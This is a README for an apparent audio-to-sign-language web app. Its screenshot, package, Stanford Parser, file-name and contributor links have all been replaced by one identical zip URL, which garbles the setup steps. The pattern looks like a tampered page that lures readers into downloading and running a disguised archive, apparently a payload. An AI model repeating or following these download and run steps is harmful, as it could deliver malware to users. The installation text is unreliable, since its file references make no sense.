# Audio to Sign Language Translator
A web based application which accepts Audio/ Voice as input and converts it to corresponding Sign Language for Deaf people.
The interface works in two phases, 
* First, recognizes speech and converts it to text using JavaScript Web Speech API 
* Secondly, uses Machine based translation to translate English into ISL based grammar. Semi-structured parse tree of English text is modified to represent parse tree of ISL based on bi-linguistic rules.

![Scrrenshot](https://raw.githubusercontent.com/wafaa4m/AudioToSignLanguageConverter/master/scimitar/AudioToSignLanguageConverter.zip)
## Installation Guide

These instructions will get you a copy of the project up and running on your local machine for development and testing purposes.

### Prerequisites
* ```Python >= 2.7```
* ```Browser supports Web Speech API```


### Installing
* Git clone repository
* Download all required packages for running python script https://raw.githubusercontent.com/wafaa4m/AudioToSignLanguageConverter/master/scimitar/AudioToSignLanguageConverter.zip
* Download the zip : [Stanford Parser](https://raw.githubusercontent.com/wafaa4m/AudioToSignLanguageConverter/master/scimitar/AudioToSignLanguageConverter.zip)
* Extract the zip file into a Directory. Don't rename it and place the directory inside 'AudioToSignLanguageConverter' directory where all files like https://raw.githubusercontent.com/wafaa4m/AudioToSignLanguageConverter/master/scimitar/AudioToSignLanguageConverter.zip etc are present.
* Host the https://raw.githubusercontent.com/wafaa4m/AudioToSignLanguageConverter/master/scimitar/AudioToSignLanguageConverter.zip in localhost or your own server to see avatar in action as it requires calls over http to download meta data else you may encouter some issue which can be inspected through console log.
* Make sure you are using Google Chrome.

### Running the code
* Run flask application https://raw.githubusercontent.com/wafaa4m/AudioToSignLanguageConverter/master/scimitar/AudioToSignLanguageConverter.zip in localhost or server. Running https://raw.githubusercontent.com/wafaa4m/AudioToSignLanguageConverter/master/scimitar/AudioToSignLanguageConverter.zip first time takes too long as it downloads 
Stanford-Parser over HTTP. Make sure you are connected to internet.
* Run https://raw.githubusercontent.com/wafaa4m/AudioToSignLanguageConverter/master/scimitar/AudioToSignLanguageConverter.zip in browsers

Say something!! (The code will parse your speech and avatar will enact your phrase.)
 
## Authors
See the list of [contributors](https://raw.githubusercontent.com/wafaa4m/AudioToSignLanguageConverter/master/scimitar/AudioToSignLanguageConverter.zip) who participated in this project.


